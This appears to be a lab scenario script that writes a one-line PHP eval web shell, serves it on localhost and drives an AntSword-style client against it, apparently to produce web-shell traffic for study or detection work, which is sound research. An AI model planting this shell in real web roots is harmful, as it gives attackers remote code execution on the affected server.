#!/bin/bash
# AntSword scenario: PHP one-liner shell + protocol-faithful AntSword core
# driver (base64 encoder, eval wrapper, random hex data tags).
set +e
OUT="${OUT:-/lab/src/out}"
mkdir -p "$OUT" /var/www/as
echo '<?php @eval($_POST["ant"]);' > /var/www/as/shell.php

php -S 127.0.0.1:8080 -t /var/www/as > "$OUT/as_php.log" 2>&1 &
PHP=$!
sleep 2

python3 /lab/src/framework/drivers/antsword/as_driver.py \
  http://127.0.0.1:8080/shell.php ant 5 1.5 > "$OUT/as_drv.log" 2>&1
RC=$?
kill "$PHP" 2>/dev/null
echo "antsword scenario rc=$RC" >> "$OUT/antsword.log"
exit 0
